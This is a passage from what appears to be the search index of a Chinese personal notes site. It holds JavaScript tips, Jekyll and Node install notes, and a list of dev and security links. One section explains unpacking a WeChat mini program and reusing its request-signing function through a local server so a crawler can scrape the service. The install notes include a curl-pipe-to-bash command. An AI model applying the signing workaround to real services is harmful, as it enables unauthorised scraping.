2000\n\nwindow.requestAnimationFrame(function fadeIn (now)) {\nconst progress = now - start\nmyElement.style.opacity = progress / duration\n\nif (progress &lt; duration) {\nwindow.requestAnimationFrame(fadeIn)\n}\n}\n</code></pre>"},{"location":"JavaScript/#src","title":"\u52ab\u6301\u52a8\u6001\u56fe\u7247\u52a0\u8f7d \u4fee\u6539src\u5c5e\u6027","text":"<p>React\u7f51\u7ad9\u5e94\u7528\u5e95\u5c42\u7528\u7684\u662fcreateElement\u65b9\u6cd5\uff08svg\u7b49\u5bf9\u8c61\u7528createElementNS\uff09\uff0c\u53ef\u4ee5\u901a\u8fc7\u52ab\u6301document\u6240\u5c5e\u7c7b\u539f\u578b\u7684createElement\u65b9\u6cd5\u6765\u5b9e\u73b0\u56fe\u7247\u8def\u5f84\u91cd\u5b9a\u5411</p> <p>\u4f46\u662f\u6ca1\u6709\u8003\u8651\u4f7f\u7528innerHTML\u76f4\u63a5\u8d4b\u503c\u7684\u64cd\u4f5c\uff0c\u5982\u679c\u76ee\u6807\u7ad9\u70b9\u786e\u5b9e\u7528\u4e86\u8fd9\u79cd\u6280\u672f\uff0c\u5927\u4e0d\u4e86\u518d\u52a0\u4e2a\u5b9a\u65f6\u5668\u904d\u5386\u5373\u53ef</p> <pre><code>var dc = HTMLDocument.prototype.createElement;\nHTMLDocument.prototype.createElement = function (tag, options) {\nvar r = dc.call(document, tag, options);\nif(tag==\"img\"||tag=='a') {\nvar x=r.setAttribute;\nr.setAttribute=function(a,b){\nif(a==\"src\"||a==\"href\"){\nif(b[0]==\"/\") b=b.replace(\"/\", window.ROOT);\nelse{\nb = b.replace(\"http://\",\"/web/0/http/0/\");\nb = b.replace(\"https://\",\"/web/0/https/0/\");\n}\n}\nreturn x.call(r,a,b);\n}\n}\nreturn r;\n}\n</code></pre> <p>\u4e0a\u8ff0\u4ee3\u7801\u4f1a\u5c06/\u5f00\u5934\u7684src\u548chref\u5c5e\u6027\u7684\u7b2c\u4e00\u4e2a/\u66ff\u6362\u4e3awindow.ROOT</p>"},{"location":"JavaScript/#ajaxfetch","title":"\u52ab\u6301Ajax\u548cfetch","text":"<p>\u9700\u8981\u5c06fetch\u4f7f\u7528xhr\u5b9e\u73b0\uff0c\u7136\u540eHook Ajax\u5373\u53ef</p> <p>\u53c2\u89c1\u5b8c\u6574\u7684RVPN\u52ab\u6301\u4ee3\u7801 jshook_preload.js</p> <p>\u80cc\u666f\u77e5\u8bc6\u53c2\u89c1\uff1aRVPN\u7f51\u9875\u7248\u4ecb\u7ecd https://www.cc98.org/topic/4816921/</p>"},{"location":"JavaScript/#ajax","title":"\u591a\u4e2aAjax\u8bf7\u6c42\u7b49\u5f85\u5168\u90e8\u5b8c\u6210","text":"<p>\u65b9\u6cd5\u5c31\u662f\u628ajQuery\u7684ajax\u51fd\u6570\u8fd4\u56de\u503c\u653e\u5230\u6570\u7ec4\u91cc\u9762\uff0c\u7136\u540e\u7528<code>$.when.apply(null, \u6570\u7ec4).done</code>\u5373\u53ef</p> <p>\u5b9e\u4f8b\uff1aCC98\u53d1\u7c73\u673a</p> <pre><code>function apiget(url, callback){\nreturn $.get(\"/98api_cache/\"+url, null, callback, \"json\");\n}\n\nvar async_request=[check_permission(topic.boardId)];\nvar i;\nfor(i=from_; i&gt;=from_-80;i-=20){\nif(i&lt;0) break;\nasync_request.push(apiget(\"Topic/\"+topicid+\"/post?from=\"+i+\"&amp;size=20\", function(data){\nlastfloors.push.apply(lastfloors,data);\n}))\n}\n\n$.when.apply(null, async_request).done( function(){ alert(\"all done\")} )\n</code></pre>"},{"location":"JavaScript/#_7","title":"\u7b49\u5f85\u56fe\u7247\u52a0\u8f7d\u5b8c\u6210\u540e \u7f29\u5c0f\u8fc7\u5927\u7684\u56fe\u7247","text":"<p>\u9996\u5148\u7b49\u5f85DOM\u8282\u70b9\u5c31\u7eea\uff0c\u627e\u5230\u6240\u6709\u7684img\uff0c\u7b49\u5f85\u56fe\u7247\u52a0\u8f7d\u5b8c\u6210\u540e\u5224\u65ad\u56fe\u7247\u9ad8\u5ea6\u662f\u5426\u5927\u4e8e\u7a97\u53e3\u9ad8\u5ea6\u768480%\uff0c\u5982\u679c\u592a\u957f\u5c31\u8bbe\u7f6e<code>max-width:80vh</code>\uff0c\u53ef\u70b9\u51fb\u5c55\u5f00\uff0c\u518d\u6b21\u70b9\u51fb\u5219\u6298\u53e0\u5e76\u8df3\u81f3\u56fe\u7247\u5f00\u59cb\u7684\u5730\u65b9</p> <pre><code>!function(a){\"function\"==typeof define&amp;&amp;define.amd?define([\"jquery\"],a):\"object\"==typeof exports?module.exports=a(require(\"jquery\")):a(jQuery)}(function(a){var b=\"waitForImages\",c=function(a){return a.srcset&amp;&amp;a.sizes}(new Image);a.waitForImages={hasImageProperties:[\"backgroundImage\",\"listStyleImage\",\"borderImage\",\"borderCornerImage\",\"cursor\"],hasImageAttributes:[\"srcset\"]},a.expr.pseudos[\"has-src\"]=function(b){return a(b).is('img[src][src!=\"\"]')},a.expr.pseudos.uncached=function(b){return!!a(b).is(\":has-src\")&amp;&amp;!b.complete},a.fn.waitForImages=function(){var d,e,f,g=0,h=0,i=a.Deferred(),j=this,k=[],l=a.waitForImages.hasImageProperties||[],m=a.waitForImages.hasImageAttributes||[],n=/url\\(\\s*(['\"]?)(.*?)\\1\\s*\\)/g;if(a.isPlainObject(arguments[0])?(f=arguments[0].waitForAll,e=arguments[0].each,d=arguments[0].finished):1===arguments.length&amp;&amp;\"boolean\"===a.type(arguments[0])?f=arguments[0]:(d=arguments[0],e=arguments[1],f=arguments[2]),d=d||a.noop,e=e||a.noop,f=!!f,!a.isFunction(d)||!a.isFunction(e))throw new TypeError(\"An invalid callback was supplied.\");return this.each(function(){var b=a(this);f?b.find(\"*\").addBack().each(function(){var b=a(this);b.is(\"img:has-src\")&amp;&amp;!b.is(\"[srcset]\")&amp;&amp;k.push({src:b.attr(\"src\"),element:b[0]}),a.each(l,function(a,c){var d,e=b.css(c);if(!e)return!0;for(;d=n.exec(e);)k.push({src:d[2],element:b[0]})}),a.each(m,function(a,c){var d=b.attr(c);return!d||void k.push({src:b.attr(\"src\"),srcset:b.attr(\"srcset\"),element:b[0]})})}):b.find(\"img:has-src\").each(function(){k.push({src:this.src,element:this})})}),g=k.length,h=0,0===g&amp;&amp;(d.call(j),i.resolveWith(j)),a.each(k,function(f,k){var l=new Image,m=\"load.\"+b+\" error.\"+b;a(l).one(m,function b(c){var f=[h,g,\"load\"==c.type];if(h++,e.apply(k.element,f),i.notifyWith(k.element,f),a(this).off(m,b),h==g)return d.call(j[0]),i.resolveWith(j[0]),!1}),c&amp;&amp;k.srcset&amp;&amp;(l.srcset=k.srcset,l.sizes=k.sizes),l.src=k.src}),i.promise()}});\n\n$(function(){$(\"img\").waitForImages(function(){ ( $(\"img\").filter(function(){return $(this).height()&gt;document.documentElement.clientHeight * 0.8}) )\n.css(\"max-height\",\"80vh\")\n.css(\"cursor\",\"pointer\")\n.on(\"click\", function(){\nif($(this).css(\"max-height\")!=\"100%\"){\n$(this).css(\"max-height\",\"100%\"); }else {\n$(this).css(\"max-height\",\"80vh\");\n$(\"html,body\").animate({scrollTop:$(this).position().top},\"fast\") }\n});  })});\n</code></pre>"},{"location":"JavaScript/#css-inline","title":"CSS inline\u6a21\u7cca\u9884\u89c8\u56fe\u7247","text":"<p>\u53c2\u8003\uff1a https://css-tricks.com/the-blur-up-technique-for-loading-background-images/</p> <p>\u4f7f\u7528\u4e00\u5f20\u5f88\u5927\u7684\u56fe\u7247\u4f5c\u4e3a\u80cc\u666f\u7684\u65f6\u5019\uff0c\u53ef\u80fd\u9700\u8981\u4e00\u5f20inline\u5230css\u4e2d\u7684\u6a21\u7cca\u80cc\u666f\u56fe\uff0c\u5b8c\u6574\u65b9\u6848\u53c2\u89c1\u4e0a\u8ff0\u94fe\u63a5</p> <p>\u8fd9\u91cc\u4ecb\u7ecd\u4ece\u4e00\u5f20\u56fe\u7247\u600e\u4e48\u53d8\u6210\u6a21\u7cca\u9884\u89c8\u7684inline CSS:</p> <ol> <li>\u9996\u5148\u628a\u56fe\u7247\u53d8\u621040x22\u5927\u5c0f\uff0c\u8fd9\u4e2a\u76f4\u63a5\u7528Windows\u81ea\u5e26\u7684\u753b\u56fe\u5de5\u5177\u5373\u53ef\u5b8c\u6210</li> <li>\u7136\u540e\u4e22\u7ed9tinyjpg.com\u518d\u538b\u7f29\u4e00\u4e0b</li> <li>\u7528<code>base64 -w0 &lt; x.jpg</code>\u83b7\u53d6\u56fe\u7247\u7684base64\u6587\u672c</li> <li>\u653e\u5165\u4e0b\u8ff0svg\u4e2d\uff0c\u518d\u4ea4\u7ed9\u8fd9\u4e2asvg encoder: https://codepen.io/yoksel/details/JDqvs/</li> </ol> <pre><code>&lt;svg xmlns=\"http://www.w3.org/2000/svg\"\nxmlns:xlink=\"http://www.w3.org/1999/xlink\"\nwidth=\"1500\" height=\"823\"\nviewBox=\"0 0 1500 823\"&gt;\n&lt;filter id=\"blur\" filterUnits=\"userSpaceOnUse\" color-interpolation-filters=\"sRGB\"&gt;\n&lt;feGaussianBlur stdDeviation=\"20 20\" edgeMode=\"duplicate\" /&gt;\n&lt;feComponentTransfer&gt;\n&lt;feFuncA type=\"discrete\" tableValues=\"1 1\" /&gt;\n&lt;/feComponentTransfer&gt;\n&lt;/filter&gt;\n&lt;image filter=\"url(#blur)\"\nxlink:href=\"data:image/jpeg;base64,/9j/4AAQSkZJ ...[truncated]...\"\nx=\"0\" y=\"0\"\nheight=\"100%\" width=\"100%\"/&gt;\n&lt;/svg&gt;\n</code></pre> <p>\u6ce8\u610fencoder\u8f93\u51fa\u7684\u5185\u5bb9\u8fd8\u8981\u52a0\u4e0a<code>charset</code>\uff0c\u6700\u7ec8\u6548\u679c\uff1a</p> <pre><code>background-image: url(data:image/svg+xml;charset=utf-8,%3Csvg...);\n</code></pre>"},{"location":"JavaScript/#apost-jquery","title":"a\u94fe\u63a5\u6539\u7528POST\u8bf7\u6c42 jQuery","text":"<p>\u53c2\u8003OneIndex\uff0c\u7528POST\u65b9\u6cd5\u8868\u793a\u6765\u81ea\u6587\u4ef6\u5217\u8868\u7684\u70b9\u51fb\u53ef\u4ee5\u663e\u793a\u7f51\u9875\uff0c\u9ed8\u8ba4\u7684GET\u8bf7\u6c42\u5219\u4e0b\u8f7d\u6587\u4ef6</p> <pre><code>    $('.file a').each(function(){\n        $(this).on('click', function () {\n            var form = $('&lt;form target=_blank method=post&gt;&lt;/form&gt;').attr('action', $(this).attr('href')).get(0);\n            $(document.body).append(form);\n            form.submit();\n            $(form).remove();\n            return false;\n        });\n    });\n</code></pre>"},{"location":"JavaScript/#blob","title":"\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\u4e0b\u8f7d Blob","text":"<p>\u53c2\u8003OneIndex\u7684<code>downall</code>\u65b9\u6cd5</p> <p>Blob\u6587\u6863\uff1ahttps://developer.mozilla.org/zh-CN/docs/Web/API/Blob</p> <p>\u8fd8\u53ef\u4ee5\u770b\u770b\u8fd9\u7bc7\uff1ahttps://juejin.im/post/59e35d0e6fb9a045030f1f35</p> <pre><code>     let blob = new Blob([\"\u6587\u6863\u5185\u5bb9\"], {\ntype: 'text/plain'\n}); // \u6784\u9020Blob\u5bf9\u8c61\nlet a = document.createElement('a'); // \u4f2a\u9020\u4e00\u4e2aa\u5bf9\u8c61\na.href = window.URL.createObjectURL(blob); // \u6784\u9020href\u5c5e\u6027\u4e3aBlob\u5bf9\u8c61\u751f\u6210\u7684\u94fe\u63a5\na.download = \"666.txt\"; // \u6587\u4ef6\u540d\u79f0\uff0c\u4f60\u53ef\u4ee5\u6839\u636e\u4f60\u7684\u9700\u8981\u6784\u9020\na.click() // \u6a21\u62df\u70b9\u51fb\na.remove();\n</code></pre>"},{"location":"JavaScript/#_8","title":"\u722c\u53d6\u5fae\u4fe1\u5c0f\u7a0b\u5e8f \u6735\u6735\u6821\u53cb\u5708","text":"<ol> <li>\u5728\u5206\u8eab\u7a7a\u95f4\u4e2d\u5b89\u88c5\u5fae\u4fe1\uff0c\u4f7f\u7528HttpCanary\u6293\u5230wxapkg\u7684url</li> <li>\u7528https://gist.githubusercontent.com/Integ/bcac5c21de5ea35b63b3db2c725f07ad/raw/a4d5f24f4d0102ce864008a86fdcc6e7888205c0/unwxapkg.py \u8fd9\u4e2a\u5de5\u5177\u5bf9\u5c0f\u7a0b\u5e8f\u89e3\u5305</li> <li>\u641c\u7d22<code>duo_session</code>\u5173\u952e\u8bcd\uff0c\u627e\u5230\u5bf9\u5e94\u7684util.js\u7684addSign\uff0c\u7528chrome\u5f00\u53d1\u4eba\u5458\u5de5\u5177\u683c\u5f0f\u5316\u4ee3\u7801</li> <li>\u770b\u4e86\u770b\u6574\u6bb5\u4ee3\u7801 \u633a\u590d\u6742\u7684\uff0c\u61d2\u5f97\u7528python\u6539\u5199\uff0c\u5c31\u4fdd\u7559\u539f\u6837js\u4f7f\u7528nodejs\u8c03\u7528\u5427</li> <li>burpsuite\u9a8c\u8bc1\u786e\u5b9e\u53ef\u884c</li> </ol> <p>\u5047\u8bbe\u4f60\u5df2\u7ecf\u6709\u4e86addSign\u65b9\u6cd5 \u90a3\u4e48\u5c31\u63d0\u4f9b\u4e2ahttp\u670d\u52a1\u7ed9python\u722c\u866b\u8c03\u7528\u5427\uff1a</p> <pre><code>var http = require(\"http\");\n\nfunction start(port) {\nfunction onRequest(request, response) {\nvar postData = \"\";\nrequest.setEncoding(\"utf8\");\n\nrequest.addListener(\"data\", function(postDataChunk) {\npostData += postDataChunk;\n});\n\nrequest.addListener(\"end\", function() {\n//console.log(postData);\nconsole.log(\"[\"+new Date().toLocaleString()+\"]\", request.connection.remoteAddress);\nvar data = JSON.parse(postData);\naddSign(data)\nresponse.writeHead(200, {\"Content-Type\": \"text/html\"});\nresponse.write(JSON.stringify(data));\nresponse.end();\n});\n}\n\nhttp.createServer(onRequest).listen(port);\nconsole.log(\"Server has started.\");\n}\n\nstart(8888);\n</code></pre>"},{"location":"JavaScript/#_9","title":"\u4fdd\u6301\u7279\u5b9a\u5143\u7d20\u76f8\u5bf9\u4e8e\u7a97\u53e3\u7684\u4f4d\u7f6e\u4e0d\u53d8","text":"<p>\u8003\u8651\u8fd9\u6837\u4e00\u4e2a\u573a\u666f\uff1a\u4e00\u4e2a\u5217\u8868\uff0c\u6bcf\u4e00\u9879\u90fd\u53ef\u4ee5\u70b9\u51fb\u6765\u5c55\u5f00\u8be6\u60c5div\uff0c\u70b9\u51fb\u65f6\u540c\u65f6\u9690\u85cf\u5176\u4ed6\u7684\u8be6\u60c5\uff08\u540c\u4e00\u65f6\u523b\u53ea\u663e\u793a\u4e00\u4e2a\uff09</p> <p>\u53d1\u73b0\u4e00\u4e2abug\uff1a\u7279\u5b9a\u60c5\u51b5\u4e0b\uff08\u4e0d\u660e\u539f\u56e0\uff09\uff0c\u7528\u6237\u70b9\u51fb\u540e\u9875\u9762\u4f4d\u7f6e\u53d1\u751f\u4e86\u53d8\u5316\uff1a\u524d\u9762\u7684\u4e00\u4e2a\u6bd4\u8f83\u957f\u7684div\u9690\u85cf\u540e\uff0c\u5f53\u524d\u7684\u4f4d\u7f6e\u8df3\u5230\u4e86\u5f88\u4e0b\u9762\u7684\u5730\u65b9\uff0c\u9700\u8981\u624b\u52a8\u7ffb\u56de\u53bb\uff0c\u7528\u6237\u4f53\u9a8c\u6781\u5dee</p> <p>\u603b\u800c\u8a00\u4e4b\uff0c\u8fdb\u884c\u4e00\u4e9b\u9875\u9762DOM\u64cd\u4f5c\u540e\uff0c\u6211\u4eec\u60f3\u4fdd\u6301\u7279\u5b9a\u5143\u7d20\u76f8\u5bf9\u4e8e\u7a97\u53e3\u7684\u4f4d\u7f6e\u4e0d\u53d8</p> <p>\u89e3\u51b3\u65b9\u6848\uff1a\u5728\u5904\u7406\u70b9\u51fbevent\u65f6\uff0c\u5148\u8bb0\u5f55event.target\u76f8\u5bf9\u4e8ewindow\u7684top\u4f4d\u7f6e\uff0c\u5728\u8be6\u60c5div\u9690\u85cf\u4ee5\u53ca\u663e\u793a\u540e\u518d\u6b21\u8bb0\u5f55top\u4f4d\u7f6e\uff0c\u8fd9\u4e24\u4e2a\u4f4d\u7f6e\u4e4b\u95f4\u7684\u5dee\u503c\u5c31\u662f\u9700\u8981\u6eda\u52a8\u9875\u9762\u7684\u591a\u5c11</p> <p>\u5f53\u8fd9\u4e2a\u5dee\u503c\u5f88\u5c0f\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\u5141\u8bb8\u7684\u8bef\u5dee\uff0c\u5b9e\u9645\u6ca1\u6709\u53ef\u89c1\u7684\u53d8\u5316 \u65e0\u9700\u64cd\u4f5c</p> <pre><code>HTML:\nonclick=\"handle_click(event)\"\n\nJS:\nfunction fix_position(et, oldt){\nvar newt = et.getBoundingClientRect().top;\nif(Math.abs(oldt-newt)&lt;2) return;\n$(window).scrollTop($(window).scrollTop()+newt-oldt);\n}\n\nfunction handle_click(event){\nvar et = event.target;\nvar oldt = et.getBoundingClientRect().top;\n//...code for hide and show divs...\nfix_position(et, oldt); //also include this line to callback function if using ajax\n}\n</code></pre>"},{"location":"JavaScript/#tampermonkey","title":"Tampermonkey\u81ea\u52a8\u586b\u5145\u7528\u6237\u540d\u5bc6\u7801\u8868\u5355\uff0c\u5e76\u901a\u8fc7\u524d\u7aef\u7684\u8868\u5355\u68c0\u67e5","text":"<p>\u611f\u8c22@CoolSpring\u7684\u89e3\u51b3\u65b9\u6848\uff1a https://v2ex.com/t/701749</p> <p>\u73b0\u4ee3\u5316\u7684\u524d\u7aef\u505a\u4e86\u8868\u5355\u68c0\u67e5\uff0c\u76f4\u63a5\u5bf9input\u8d4b\u503c\u4e0d\u80fd\u901a\u8fc7\u68c0\u67e5\uff0c\u9700\u8981\u8c03\u7528\u88ab\u91cd\u8f7d\u7684setter\u51fd\u6570\uff1a</p> <pre><code>function mytype(input, value){\nvar nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, \"value\").set;\nnativeInputValueSetter.call(input, value);\ninput.dispatchEvent(new Event('input', {bubbles: true}));\n}\n</code></pre> <p>\u7528\u6cd5\uff1a</p> <pre><code>    mytype(document.querySelectorAll(\"input\")[0], USERNAME);\n    mytype(document.querySelectorAll(\"input\")[1], PASSWORD);\n</code></pre>"},{"location":"JavaScript/#browserifynpmjs","title":"\u4f7f\u7528browserify\u5c06npm\u5305\u6253\u5305\u6210\u6d4f\u89c8\u5668\u80fd\u7528\u7684js\u6587\u4ef6","text":"<p>\u6d4f\u89c8\u5668\u4e0d\u652f\u6301require\uff0c\u600e\u4e48\u5728\u6d4f\u89c8\u5668\u91cc\u4f7f\u7528\u4e00\u4e2anpm\u5305\u5462\uff1f browserify</p> <p>\u793a\u4f8b\uff1a\u6211\u60f3\u5728tampermonkey\u91cc\u4f7f\u7528user-event\u8fd9\u4e2anpm\u5305\uff0c \u7528\u6765\u5b8c\u6574\u5730\u6a21\u62df\u7528\u6237\u7684\u4ea4\u4e92\uff0c\u8fd9\u4e2a\u5176\u5b9e\u662f\u4e0a\u4e00\u4e2a\u95ee\u9898\u7684\u7b28\u91cd\u7248\u672c\u7684\u89e3\u51b3\u65b9\u6848</p> <pre><code># \u5148\u5b89\u88c5\u76ee\u6807\u5e93\u3001browserify\u548cterser\ncnpm install @testing-library/user-event @testing-library/dom --save-dev\ncnpm i -g browserify terser\n\n# \u5199\u4e00\u4e2amain.js\u5bfc\u5165\u8fd9\u4e2a\u5e93\uff0c\u5bfc\u51fa\u5230window\u91cc\nvar userEvent = require('@testing-library/user-event');\nwindow.userEvent = userEvent.default;\n\n# \u6267\u884c\u6253\u5305\nbrowserify main.js | terser --compress --mangle &gt; bundle.js\n\n# \u5728tampermonkey\u91cc\u4f7f\u7528\n// @require      \u4e0a\u4f20\u5230cdn\u540e\u7684js\u5730\u5740\nuserEvent.type(document.querySelectorAll(\"input\")[0], USERNAME);\n</code></pre>"},{"location":"JavaScript/#ubuntunodejs","title":"Ubuntu\u5b89\u88c5nodejs","text":"<pre><code>curl -fsSL https://deb.nodesource.com/setup_16.x | bash -\ncurl -sL https://dl.yarnpkg.com/debian/pubkey.gpg | gpg --dearmor | tee /usr/share/keyrings/yarnkey.gpg &gt;/dev/null\necho \"deb [signed-by=/usr/share/keyrings/yarnkey.gpg] https://dl.yarnpkg.com/debian stable main\" | tee /etc/apt/sources.list.d/yarn.list\napt update &amp;&amp; apt install -y nodejs yarn\n\nyarn config set registry https://registry.npm.taobao.org -g\nyarn config set disturl https://npm.taobao.org/dist -g\nyarn config set electron_mirror https://npm.taobao.org/mirrors/electron/ -g\nyarn config set sass_binary_site https://npm.taobao.org/mirrors/node-sass/ -g\nyarn config set phantomjs_cdnurl https://npm.taobao.org/mirrors/phantomjs/ -g\nyarn config set chromedriver_cdnurl https://cdn.npm.taobao.org/dist/chromedriver -g\nyarn config set operadriver_cdnurl https://cdn.npm.taobao.org/dist/operadriver -g\nyarn config set fse_binary_host_mirror https://npm.taobao.org/mirrors/fsevents -g\n</code></pre>"},{"location":"Jekyll/","title":"Jekyll","text":"<p>\u76ee\u524d\u672c\u7ad9\u4f7f\u7528 <code>Github Pages</code>\uff0c~~\u91c7\u7528<code>Jekyll</code>\u8f6c\u6362md\u4e3ahtml~~\uff0c\u6240\u4ee5\u6709\u5fc5\u8981\u8bb0\u5f55\u4e00\u4e0b\u6298\u817eJekyll\u7684\u8fc7\u7a0b\u54af</p> <p>\u66f4\u65b0\uff1a\u76ee\u524d\u5df2\u7ecf\u4e0d\u518d\u4f7f\u7528Jekyll\uff0c\u6539\u7528mkdocs</p>"},{"location":"Jekyll/#_1","title":"\u78b0\u5230\u8fc7\u7684\u5751","text":"<ol> <li> <p>jekyll \u4e0d\u8ba4 gbk \u7f16\u7801\uff0c\u5728\u8f6c\u6362\u524d\u9700\u8981\u5148\u5c06 md \u6587\u4ef6\u7f16\u7801\u6539\u4e3aUTF-8</p> </li> <li> <p>\u672c\u5730\u7f16\u8bd1\u901a\u8fc7\u4e86\uff0c\u4f46Github\u5c31\u662f\u4e0d\u8ba4\uff0c\u4e8e\u662f\u5e72\u8106\u628a\u7f16\u8bd1\u597d\u7684html\u4f5c\u4e3aGithub Pages</p> </li> <li> <p>\u8f6c\u6362\u7684\u65f6\u5019\u9047\u5230\u4e24\u4e2a\u5927\u62ec\u53f7\u4e4b\u95f4\u7684\u4e1c\u897f\u4f1a\u81ea\u52a8\u7528Liquid\u6e32\u67d3\uff0c\u5bfc\u81f4\u6709\u4e00\u6761Docker\u7684\u7b14\u8bb0\u5c31\u4e22\u4e86\u4e1c\u897f\u5e76\u629b\u51fa\u4e86Warning\uff0c\u4e4b\u524d\u672c\u7740\u4e0d\u6298\u817e\u7684\u539f\u5219(\u5c31\u662f\u61d2)\uff0c\u76f4\u63a5\u5199\u4e86\u4e2acompile.sh\u5728jekyll\u7f16\u8bd1\u8fc7\u540e\u7528py\u66ff\u6362\u4e86\u4e00\u4e0b(\u771f\u4e0d\u4f18\u96c523333)\uff1b\u73b0\u5728\u53d1\u73b0\u4e86\u89e3\u51b3\u65b9\u6848\uff0c\u53c2\u89c1\u672c\u9875md\u6587\u4ef6</p> </li> </ol>"},{"location":"Jekyll/#_2","title":"\u914d\u7f6e\u4ee3\u7801\u9ad8\u4eae\u5e76\u663e\u793a\u884c\u53f7","text":"<p>\u4ee3\u7801\uff1a</p> <pre><code>{% highlight java linenos %}\npublic class HelloWorld {\n    public static void main(String args[]) {\n      System.out.println(\"Hello World!\");\n    }\n}\n{% endhighlight %}\n</code></pre> <p>\u6548\u679c\u5982\u4e0b\uff1a(\u7531\u4e8e\u73b0\u5728\u5df2\u7ecf\u4e0d\u518d\u4f7f\u7528Jekyll\uff0c\u6240\u4ee5\u770b\u4e0d\u51fa\u4e8623333\uff09</p> <p>{% highlight java linenos %} public class HelloWorld {     public static void main(String args[]) {       System.out.println(\u201cHello World!\u201d);     } } {% endhighlight %}</p>"},{"location":"Jekyll/#github-metadata-warning","title":"\u89e3\u51b3Github Metadata Warning","text":"<ul> <li>\u53c2\u89c1http://mycyberuniverse.com/web/fixing-jekyll-github-metadata-warning.html</li> </ul> <p>\u5728\u6267\u884cbuild\u6216serve\u65f6\uff0c\u4f1a\u7ed9\u51fa\u8fd9\u6837\u7684Warning:</p> <pre><code>GitHub Metadata: No GitHub API authentication could be found. Some fields may be missing or have incorrect data.\n</code></pre> <p>\u89e3\u51b3\u65b9\u6cd5\u8be6\u7ec6\u7248\u8bf7\u89c1\u4e0a\u8ff0\u94fe\u63a5\uff0c\u7b80\u8981\u7248\uff1a\u5728Github\u7684\u8bbe\u7f6e\u4e2d\u5f97\u5230\u4e00\u4e2a\u80fd\u8bbf\u95ee\u516c\u5f00repo\u7684token\uff0c\u7528\u4ee5\u4e0b\u547d\u4ee4\u914d\u7f6e\u73af\u5883\u53d8\u91cf\uff0c\u5176\u4e2dabc123\u6539\u4e3a\u81ea\u5df1\u7684token</p> <pre><code>export JEKYLL_GITHUB_TOKEN='abc123'\n</code></pre>"},{"location":"Jekyll/#markdown","title":"\u89e3\u51b3Markdown\u6709\u5e8f\u5217\u8868\u88ab\u6587\u5b57\u95f4\u9694\u7684\u95ee\u9898","text":"<p>\u53c2\u8003\uff1a http://stackoverflow.com/questions/18088955/markdown-continue-numbered-list</p> <p>\u5728\u51993. \u4e4b\u524d\u52a0\u5165\u76f8\u5e94\u7684\u7f16\u53f7\u63a7\u5236\uff1a</p> <pre><code>{:start=\"3\"}\n</code></pre>"},{"location":"Jekyll/#jekyll_1","title":"\u5b89\u88c5Jekyll","text":"<p>\u641c\u7d22jekyll\u53d1\u73b0\u5b98\u7f51https://jekyllrb.com/</p> <p>\u5b89\u88c5\u8fc7\u7a0b\u4e00\u70b9\u90fd\u4e0d\u7b80\u5355\uff0c \u6211\u7684\u7cfb\u7edf\u73af\u5883\uff1aubuntu16.04 on win10</p> <p>\u5b89\u88c5\u547d\u4ee4\u53c2\u8003\u5b98\u7f51\u53ca\u56fd\u5185\u955c\u50cf Ruby China\uff0c\u8fd8\u8e29\u4e86\u57511, \u57512</p> <pre><code>apt install -y ruby ruby-dev zlib1g-dev nodejs # \u5176\u4e2dzlib\u662f\u5b89\u88c5\u4f9d\u8d56nokogiri\uff08\u8fd9\u4e2a\u4f9d\u8d56\u7f16\u8bd1\u7279\u522b\u6162\uff09\u6240\u5fc5\u987b\u7684\uff0c\u5176\u4e2dnodejs\u662f\u9700\u8981\u7684javascript\u8fd0\u884c\u73af\u5883\ngem update --system # \u8fd9\u91cc\u8bf7\u7ffb\u5899\u4e00\u4e0b\ngem sources --add https://gems.ruby-china.org/ --remove https://rubygems.org/\ngem install jekyll bundler\n\n# \u914d\u7f6egithub-pages\u6240\u9700\u7684Gemfile\uff0c\u4e5f\u4f7f\u7528\u56fd\u5185\u955c\u50cf\u6e90\necho \"\"\"source 'https://gems.ruby-china.org'\ngem 'github-pages', group: :jekyll_plugins\"\"\"&gt;Gemfile\nbundle install # \u8010\u5fc3\u7b49\u5f85\u7f16\u8bd1\n</code></pre>"},{"location":"Links/","title":"Links Share","text":"<p>\u5206\u4eab\u4e00\u4e9bhacker\u76f8\u5173\u7684\u94fe\u63a5, \u5305\u542b\u5f00\u53d1\u3001\u5b89\u5168\u3001CTF</p> <p>\u89c9\u5f97\u6ca1\u4e8b\u5e72\uff1f \u4e0d\u5982\u6765\u901b\u901b\u8fd9\u4e9b\u5730\u65b9\u5427\uff1a</p>"},{"location":"Links/#_1","title":"\u5f00\u53d1\u7c7b","text":"<p>Free Programming Books \u2013 github.com/vhf/free-programming-books \u2013 \u7f16\u7a0b\u76f8\u5173\u7684\u4e66\u7c4d</p> <p>\u7801\u519c\u7ffb\u8eab\u5fae\u4fe1\u6587\u7ae0 \u2013 mp.weixin.qq.com/s/nCx7Jb5WRXGzkpsuth6LAw</p> <p>V2EX \u2013 www.v2ex.com</p> <p>\u63a8\u9177 \u2013 tuicool.com</p> <p>\u6398\u91d1 \u2013 juejin.im</p> <p>PAT \u2013 patest.cn \u2013 \u7c7b\u4f3c\u7684\u8fd8\u6709ZOJ, Leetcode\u7b49</p>"},{"location":"Links/#_2","title":"\u5b89\u5168\u6280\u80fd","text":"<p>\u77e5\u9053\u521b\u5b87\u7814\u53d1\u6280\u80fd\u8868 \u2013 blog.knownsec.com</p> <p>i\u6625\u79cb \u2013 ichunqiu.com</p> <p>\u5408\u5929 \u2013 hetianlab.com</p> <p>\u5b9e\u9a8c\u697c \u2013 shiyanlou.com</p> <p>\u4e4c\u4e91\u6f0f\u6d1e\u5e93\u955c\u50cf \u2013 loner.fm</p> <p>pwnhub \u2013 pwnhub.cn</p> <p>pwnable \u2013 pwnable.kr</p> <p>Jarvis OJ \u2013 jarvisoj.com</p> <p>dnsbllookup \u2013 dnsbllookup.com \u67e5\u8be2ip\u662f\u5426\u5728\u9ed1\u540d\u5355\u4e2d \u5176\u4e2d\u6709\u4e24\u4e2a\u5df2\u7ecf\u57df\u540d\u8fc7\u671f\u603b\u662f\u8fd4\u56deListed</p>"},{"location":"Links/#_3","title":"\u5b89\u5168\u8d44\u8baf","text":"<p>FreeBuf \u2013 www.freebuf.com</p> <p>\u5b89\u5168\u5ba2 \u2013 bobao.360.cn</p> <p>bugs.chromium.org</p>"},{"location":"Links/#_4","title":"\u4e2a\u4eba\u535a\u5ba2","text":"<p>\u6309\u5b57\u6bcd\u987a\u5e8f\u6392\u5e8f</p> <p>Aploium Blog \u2013 z.codes</p> <p>Aqua\u2019s Blog \u2013 aqua.hk.cn</p> <p>ByStudent 